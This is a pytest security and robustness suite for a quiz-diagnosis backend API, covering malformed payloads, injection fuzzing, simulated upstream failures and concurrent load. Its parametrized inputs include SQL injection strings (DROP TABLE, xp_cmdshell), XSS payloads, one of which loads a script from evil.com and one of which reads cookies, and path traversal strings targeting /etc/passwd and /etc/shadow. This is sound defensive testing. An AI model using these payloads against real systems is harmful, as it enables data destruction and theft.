"""
Adversarial Stress & Security Testing Suite for JC2001 Backend API Contracts
Challenger 1: Empirical Robustness, Fuzzing, Concurrency, and Zero-500 Guarantee.

Authority:
- ORIGINAL_REQUEST.md (R1, R3, Acceptance Criteria)
- orchestrator_1/PROJECT.md (API Contracts, Schemas, Robustness Requirements)
- Challenger 1 Dispatch Directives (Malformed payloads, SQLi, XSS, >10k strings,
  simulated timeouts/offline, 50 concurrent calls, zero 500 guarantee).
"""

import sys
import time
import concurrent.futures
from pathlib import Path
from typing import List, Dict, Any
from unittest.mock import patch, MagicMock

import httpx
import pytest
from starlette.testclient import TestClient

# Ensure project root is imported
PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from backend.app.config import settings
from backend.app.models.diagnose import DiagnoseResponse


# =============================================================================
# Tier 1: Malformed Payloads & Schema Validation Contracts
# =============================================================================

class TestMalformedPayloads:
    """Verifies backend resilience against corrupt, empty, and malformed inputs."""

    def test_diagnose_empty_json_body(self, client: TestClient):
        """
        Verify POST /api/diagnose with an empty JSON object '{}' is handled
        gracefully by Pydantic defaults or falls back without a 500 crash.
        """
        response = client.post("/api/diagnose", json={})
        assert response.status_code != 500, f"Expected non-500, got {response.status_code}: {response.text}"
        assert response.status_code in (200, 422), f"Expected 200 or 422, got {response.status_code}"
        if response.status_code == 200:
            data = response.json()
            assert "is_correct" in data or "isCorrect" in data

    def test_diagnose_invalid_json_syntax(self, client: TestClient):
        """
        Verify POST /api/diagnose with corrupt/malformed JSON syntax returns HTTP 422/400,
        never unhandled 500.
        """
        response = client.post(
            "/api/diagnose",
            content='{"question_id": "econ_1", "broken_json": ',
            headers={"Content-Type": "application/json"}
        )
        assert response.status_code != 500, f"Malformed JSON syntax caused 500: {response.text}"
        assert response.status_code in (400, 422), f"Expected 400 or 422, got {response.status_code}"

    def test_diagnose_non_string_types(self, client: TestClient):
        """
        Verify POST /api/diagnose rejects non-string complex types (lists, dicts)
        for question_id and selected_key with HTTP 422, never crashing with 500.
        """
        bad_payloads = [
            {"question_id": [1, 2, 3], "selected_key": "A"},
            {"question_id": {"nested": "dict"}, "selected_key": "A"},
            {"question_id": "econ_1", "selected_key": ["A", "B"]},
            {"question_id": "econ_1", "selected_key": {"option": "A"}},
            {"question_id": "econ_1", "selected_key": "A", "include_socratic": "invalid_bool_value_xyz"},
        ]
        for payload in bad_payloads:
            response = client.post("/api/diagnose", json=payload)
            assert response.status_code != 500, f"Payload {payload} caused 500 error: {response.text}"
            assert response.status_code == 422, f"Payload {payload} expected 422, got {response.status_code}"

    def test_diagnose_extra_unknown_fields(self, client: TestClient):
        """
        Verify POST /api/diagnose accepts extra non-contract fields without crashing,
        supporting client evolution (CamelModel extra='allow').
        """
        payload = {
            "question_id": "econ_1",
            "selected_key": "A",
            "unexpected_metadata": {"client_version": "9.9.9", "debug": True},
            "random_field_xyz": 12345
        }
        response = client.post("/api/diagnose", json=payload)
        assert response.status_code == 200, f"Expected 200 for extra fields, got {response.status_code}: {response.text}"
        data = response.json()
        assert data.get("is_correct") is False

    def test_quiz_boundary_limit_parameters(self, client: TestClient):
        """
        Verify GET /api/quiz rejects invalid limit parameters (<=0, non-int) with HTTP 422,
        and safely handles extreme limits without crashing.
        """
        # Negative limit
        r_neg = client.get("/api/quiz?limit=-1")
        assert r_neg.status_code == 422, f"Expected 422 for limit=-1, got {r_neg.status_code}"

        # Zero limit
        r_zero = client.get("/api/quiz?limit=0")
        assert r_zero.status_code == 422, f"Expected 422 for limit=0, got {r_zero.status_code}"

        # Non-numeric limit
        r_str = client.get("/api/quiz?limit=not_a_number")
        assert r_str.status_code == 422, f"Expected 422 for limit=not_a_number, got {r_str.status_code}"

        # Very large numeric limit (should safely return all available items without crashing)
        r_large = client.get("/api/quiz?limit=999999")
        assert r_large.status_code == 200, f"Expected 200 for limit=999999, got {r_large.status_code}"
        assert isinstance(r_large.json(), list)


# =============================================================================
# Tier 2: Security & Boundary Fuzzing (SQLi, XSS, Path Traversal, Extreme Length)
# =============================================================================

class TestInjectionAndSecurityBoundaries:
    """Verifies that hostile attack vectors and fuzzing payloads are neutralized."""

    @pytest.mark.parametrize("sqli_vector", [
        "' OR '1'='1",
        "econ_1' OR 1=1; DROP TABLE questions; --",
        "' UNION SELECT NULL, NULL, NULL, NULL --",
        "1; EXEC xp_cmdshell('dir'); --",
        "admin'--",
    ])
    def test_diagnose_sqli_resilience(self, client: TestClient, sqli_vector: str):
        """
        Verify SQL injection attack strings in question_id or selected_key do not trigger 500,
        cause database errors, or bypass fallback resolution.
        """
        # Test in question_id
        res_q = client.post("/api/diagnose", json={"question_id": sqli_vector, "selected_key": "A"})
        assert res_q.status_code == 200, f"SQLi in question_id caused status {res_q.status_code}: {res_q.text}"
        data_q = res_q.json()
        assert data_q.get("fallback_mode") is True

        # Test in selected_key
        res_k = client.post("/api/diagnose", json={"question_id": "econ_1", "selected_key": sqli_vector})
        assert res_k.status_code == 200, f"SQLi in selected_key caused status {res_k.status_code}: {res_k.text}"

    @pytest.mark.parametrize("sqli_vector", [
        "' OR '1'='1",
        "econ' OR 1=1 --",
        "'; DROP TABLE subjects; --",
    ])
    def test_quiz_sqli_in_subject(self, client: TestClient, sqli_vector: str):
        """
        Verify SQL injection vector in subject query param safely returns empty list or
        safe handled response, never crashing with 500.
        """
        res = client.get(f"/api/quiz?subject={sqli_vector}")
        assert res.status_code == 200, f"SQLi in subject query caused status {res.status_code}: {res.text}"
        data = res.json()
        assert isinstance(data, list)

    @pytest.mark.parametrize("xss_vector", [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "<svg/onload=confirm(1)>",
        "javascript:alert(1)",
        "'\"><script src=//evil.com/xss.js></script>",
    ])
    def test_diagnose_xss_resilience(self, client: TestClient, xss_vector: str):
        """
        Verify XSS attack strings in question_id, selected_key, or user_answer_text
        do not cause 500 crashes and are treated safely as plain text.
        """
        payload = {
            "question_id": xss_vector,
            "selected_key": xss_vector,
            "user_answer_text": xss_vector
        }
        res = client.post("/api/diagnose", json=payload)
        assert res.status_code == 200, f"XSS vector caused status {res.status_code}: {res.text}"
        data = res.json()
        assert data.get("fallback_mode") is True

    @pytest.mark.parametrize("traversal_vector", [
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/shadow",
    ])
    def test_path_traversal_resilience(self, client: TestClient, traversal_vector: str):
        """
        Verify path traversal payloads in question_id or endpoints do not expose internal
        files or trigger 500 errors.
        """
        res = client.post("/api/diagnose", json={"question_id": traversal_vector, "selected_key": "A"})
        assert res.status_code == 200, f"Path traversal in diagnose caused {res.status_code}: {res.text}"

        res_quiz = client.get(f"/api/quiz?subject={traversal_vector}")
        assert res_quiz.status_code == 200, f"Path traversal in quiz caused {res_quiz.status_code}"
        assert isinstance(res_quiz.json(), list)

    def test_extreme_string_length_fuzzing(self, client: TestClient):
        """
        Verify payloads exceeding 15,000 to 25,000 characters in question_id,
        selected_key, and subject query do not cause ReDoS, memory exhaustion,
        or 500 Internal Server Errors.
        """
        huge_question_id = "A" * 16384  # 16 KB string
        huge_selected_key = "B" * 16384  # 16 KB string
        huge_subject = "econ_" * 3000   # 15 KB string

        start_time = time.perf_counter()

        # Fuzz diagnose endpoint
        res_diag = client.post("/api/diagnose", json={
            "question_id": huge_question_id,
            "selected_key": huge_selected_key
        })
        assert res_diag.status_code == 200, f"Extreme length caused {res_diag.status_code}: {res_diag.text}"

        # Fuzz quiz endpoint
        res_quiz = client.get(f"/api/quiz?subject={huge_subject}")
        assert res_quiz.status_code == 200, f"Extreme length in quiz caused {res_quiz.status_code}"
        assert isinstance(res_quiz.json(), list)

        elapsed = time.perf_counter() - start_time
        assert elapsed < 3.0, f"Extreme string fuzzing took too long ({elapsed:.2f}s), possible ReDoS or memory hang"


# =============================================================================
# Tier 3: Edge Case Inputs & Unknown Entities
# =============================================================================

class TestEdgeCaseInputsAndParameters:
    """Verifies behavior on unknown subjects, ghost questions, and unicode characters."""

    def test_quiz_unknown_subject_returns_empty_list(self, client: TestClient):
        """
        Verify querying a completely unknown subject returns an empty list [] with HTTP 200,
        never a 500 error or crash.
        """
        res = client.get("/api/quiz?subject=quantum_string_theory_xyz")
        assert res.status_code == 200, f"Expected 200, got {res.status_code}"
        assert res.json() == [], f"Expected empty list for unknown subject, got {res.json()}"

    def test_quiz_empty_and_whitespace_subject(self, client: TestClient):
        """
        Verify empty or whitespace-only subject parameter does not cause 500,
        and consistently returns a valid list conforming to the API contract.
        """
        for param in ["", "   ", "\t"]:
            res = client.get("/api/quiz", params={"subject": param})
            assert res.status_code == 200, f"Subject='{param}' caused {res.status_code}"
            assert isinstance(res.json(), list)
            # When stripped to empty, defaults to full question bank (12 questions)
            assert len(res.json()) > 0, "Stripped empty subject should return question list"

    def test_diagnose_unknown_question_id_fallback(self, client: TestClient):
        """
        Verify passing a non-existent question_id activates the safe fallback shield
        and returns HTTP 200 with fallback_mode=True.
        """
        payload = {"question_id": "ghost_question_99999", "selected_key": "B"}
        res = client.post("/api/diagnose", json=payload)
        assert res.status_code == 200, f"Expected 200, got {res.status_code}: {res.text}"
        data = res.json()
        assert data.get("fallback_mode") is True
        assert data.get("is_correct") is False
        assert "未能定位到指定题目编号" in data.get("explanation", "") or "高可用" in data.get("explanation", "")

    def test_diagnose_invalid_option_keys(self, client: TestClient):
        """
        Verify non-standard option keys (e.g. 'Z', '9', '', 'XYZ') are handled safely.
        """
        for key in ["Z", "9", "", "UNKNOWN_KEY", " "]:
            payload = {"question_id": "econ_1", "selected_key": key}
            res = client.post("/api/diagnose", json=payload)
            assert res.status_code == 200, f"Option key '{key}' caused {res.status_code}: {res.text}"
            data = res.json()
            # Non-existent option key is not correct
            assert data.get("is_correct") is False

    def test_diagnose_unicode_and_emojis(self, client: TestClient):
        """
        Verify full unicode, emojis, and non-ASCII character resilience.
        """
        unicode_samples = [
            "🚀🔥💡🧠",
            "测试学科考点",
            "اللغة العربية",
            "русский язык",
            "\u200b\u200c\u200d",  # Zero-width spaces
            "True",
            "None",
            "null",
        ]
        for sample in unicode_samples:
            payload = {"question_id": "econ_1", "selected_key": sample}
            res = client.post("/api/diagnose", json=payload)
            assert res.status_code == 200, f"Unicode '{sample}' caused {res.status_code}"
            data = res.json()
            assert isinstance(data, dict)


# =============================================================================
# Tier 4: Simulated Network Latency, Offline, & Fault Tolerance
# =============================================================================

class TestOfflineAndFaultTolerance:
    """Verifies that network issues, API timeouts, and upstream errors never cause 500s."""

    def test_diagnose_offline_mode_active(self, client: TestClient):
        """
        Verify that in offline mode (API key clean), POST /api/diagnose returns
        valid DiagnoseResponse with fallback_mode=True and HTTP 200.
        """
        payload = {"question_id": "econ_1", "selected_option": "A"}
        res = client.post("/api/diagnose", json=payload)
        assert res.status_code == 200
        data = res.json()
        assert data["fallback_mode"] is True
        assert data["model_used"] == "local-knowledge-seed"
        assert len(data["socratic_guidance"]) > 0

    def test_diagnose_simulated_dashscope_timeout(self, client: TestClient, monkeypatch: pytest.MonkeyPatch):
        """
        Simulate DashScope API network timeout (httpx.TimeoutException).
        Verify POST /api/diagnose catches the exception and cleanly falls back without 500.
        """
        monkeypatch.setattr(settings, "QWEN_API_KEY", "sk-simulated-mock-key")

        async def mock_post(*args, **kwargs):
            raise httpx.TimeoutException("Simulated 4.0s timeout to DashScope")

        with patch("httpx.AsyncClient.post", side_effect=mock_post):
            payload = {"question_id": "econ_1", "selected_option": "A"}
            res = client.post("/api/diagnose", json=payload)
            assert res.status_code == 200, f"Timeout triggered {res.status_code}: {res.text}"
            data = res.json()
            assert data.get("fallback_mode") is True
            assert data.get("model_used") == "local-knowledge-seed"

    def test_diagnose_simulated_dashscope_connection_failure(self, client: TestClient, monkeypatch: pytest.MonkeyPatch):
        """
        Simulate DashScope network disconnect (httpx.ConnectError).
        Verify POST /api/diagnose catches it and returns HTTP 200 with fallback.
        """
        monkeypatch.setattr(settings, "QWEN_API_KEY", "sk-simulated-mock-key")

        async def mock_post(*args, **kwargs):
            raise httpx.ConnectError("Simulated DNS resolution or connection dropped")

        with patch("httpx.AsyncClient.post", side_effect=mock_post):
            payload = {"question_id": "econ_1", "selected_option": "A"}
            res = client.post("/api/diagnose", json=payload)
            assert res.status_code == 200, f"ConnectError triggered {res.status_code}: {res.text}"
            data = res.json()
            assert data.get("fallback_mode") is True

    def test_diagnose_simulated_dashscope_upstream_500_response(self, client: TestClient, monkeypatch: pytest.MonkeyPatch):
        """
        Simulate DashScope returning an upstream HTTP 500 / 429 error.
        Verify POST /api/diagnose falls back cleanly without passing the 500 to the client.
        """
        monkeypatch.setattr(settings, "QWEN_API_KEY", "sk-simulated-mock-key")

        mock_resp = MagicMock()
        mock_resp.status_code = 500
        mock_resp.text = '{"code": "InternalError", "message": "DashScope service temporary error"}'

        async def mock_post(*args, **kwargs):
            return mock_resp

        with patch("httpx.AsyncClient.post", side_effect=mock_post):
            payload = {"question_id": "econ_1", "selected_option": "A"}
            res = client.post("/api/diagnose", json=payload)
            assert res.status_code == 200, f"Upstream 500 leaked to client: {res.text}"
            data = res.json()
            assert data.get("fallback_mode") is True

    def test_diagnose_simulated_internal_catastrophic_exception(self, client: TestClient):
        """
        Simulate an unexpected internal RuntimeError inside question resolution.
        Verify the outermost failsafe shield catches it and returns HTTP 200 DiagnoseResponse,
        satisfying the strict Zero-500 guarantee.
        """
        with patch("backend.app.services.quiz_service.QuizService.get_question_by_id", side_effect=RuntimeError("Simulated critical DB failure")):
            payload = {"question_id": "econ_1", "selected_option": "A"}
            res = client.post("/api/diagnose", json=payload)
            assert res.status_code == 200, f"Failsafe shield failed: {res.status_code}: {res.text}"
            data = res.json()
            assert data.get("fallback_mode") is True
            assert data.get("model_used") == "local-failsafe-shield"
            assert "高可用安全兜底" in data.get("trap_name", "") or "高可用" in data.get("explanation", "")


# =============================================================================
# Tier 5: Rapid Concurrency & Stress Load (50 Rapid Calls)
# =============================================================================

class TestConcurrencyAndStress:
    """Verifies system stability under rapid concurrent requests."""

    def test_rapid_concurrent_diagnose_calls(self, client: TestClient):
        """
        Execute 50 rapid concurrent POST /api/diagnose requests.
        Verify that all 50 requests succeed with HTTP 200 and zero 500 errors.
        """
        num_requests = 50
        payloads = [
            {"question_id": f"econ_{1 + (i % 3)}", "selected_option": "A" if i % 2 == 0 else "B"}
            for i in range(num_requests)
        ]

        def send_diagnose(payload: dict):
            return client.post("/api/diagnose", json=payload)

        start_time = time.perf_counter()
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(send_diagnose, p) for p in payloads]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
        elapsed = time.perf_counter() - start_time

        assert len(results) == num_requests
        status_codes = [r.status_code for r in results]
        
        # Assert zero 500 errors
        assert 500 not in status_codes, f"Found 500 errors during concurrent diagnose calls: {status_codes}"
        
        # All requests must succeed with 200
        assert all(code == 200 for code in status_codes), f"Non-200 status codes found: {status_codes}"
        
        # Throughput check: 50 in-memory requests should complete comfortably within 5 seconds
        assert elapsed < 5.0, f"50 concurrent diagnose calls took {elapsed:.2f}s (exceeded 5.0s threshold)"

    def test_rapid_concurrent_quiz_calls(self, client: TestClient):
        """
        Execute 50 rapid concurrent GET /api/quiz requests across various subjects.
        Verify zero 500 errors and consistent data structures.
        """
        num_requests = 50
        subjects = ["econ", "economics", "cs", "computer_science", "law", "se", "unknown_sub"]

        def send_quiz(idx: int):
            sub = subjects[idx % len(subjects)]
            return client.get(f"/api/quiz?subject={sub}")

        start_time = time.perf_counter()
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(send_quiz, i) for i in range(num_requests)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
        elapsed = time.perf_counter() - start_time

        assert len(results) == num_requests
        status_codes = [r.status_code for r in results]
        assert 500 not in status_codes, f"Found 500 errors during concurrent quiz calls: {status_codes}"
        assert all(code == 200 for code in status_codes)
        assert elapsed < 4.0, f"50 concurrent quiz calls took {elapsed:.2f}s"

    def test_mixed_rapid_concurrent_load(self, client: TestClient):
        """
        Execute 60 interleaved concurrent requests combining /api/health, /api/quiz,
        and /api/diagnose simultaneously to verify thread-safety and shared state stability.
        """
        num_requests = 60

        def send_mixed_request(idx: int):
            req_type = idx % 3
            if req_type == 0:
                return client.get("/api/health")
            elif req_type == 1:
                return client.get("/api/quiz?subject=econ")
            else:
                return client.post("/api/diagnose", json={"question_id": "econ_1", "selected_option": "A"})

        start_time = time.perf_counter()
        with concurrent.futures.ThreadPoolExecutor(max_workers=12) as executor:
            futures = [executor.submit(send_mixed_request, i) for i in range(num_requests)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
        elapsed = time.perf_counter() - start_time

        assert len(results) == num_requests
        status_codes = [r.status_code for r in results]
        assert 500 not in status_codes, f"Found 500 errors in mixed load: {status_codes}"
        assert all(code == 200 for code in status_codes)
        assert elapsed < 5.0, f"Mixed load took {elapsed:.2f}s"


# =============================================================================
# Tier 6: HTTP Methods & Route Integrity
# =============================================================================

class TestHttpMethodsAndEndpoints:
    """Verifies that invalid HTTP methods and unmapped routes do not return 500s."""

    def test_unsupported_http_methods(self, client: TestClient):
        """
        Verify sending unsupported HTTP methods (e.g. POST to GET endpoints,
        GET to POST endpoints) returns 405 Method Not Allowed (or 404 where StaticFiles fallthrough occurs),
        never 500.
        """
        checks = [
            ("POST", "/api/health"),
            ("DELETE", "/api/health"),
            ("POST", "/api/quiz"),
            ("DELETE", "/api/quiz"),
            ("GET", "/api/diagnose"),
            ("PUT", "/api/diagnose"),
        ]
        for method, endpoint in checks:
            res = client.request(method, endpoint)
            assert res.status_code != 500, f"{method} {endpoint} returned 500 error: {res.text}"
            assert res.status_code in (404, 405), f"{method} {endpoint} expected 404 or 405, got {res.status_code}"

    def test_unmapped_api_route_returns_404(self, client: TestClient):
        """
        Verify requests to unmapped /api routes return 404 Not Found, never 500.
        """
        res = client.get("/api/nonexistent_route_12345")
        assert res.status_code != 500, f"Unmapped route returned 500: {res.text}"
        assert res.status_code == 404, f"Expected 404, got {res.status_code}"
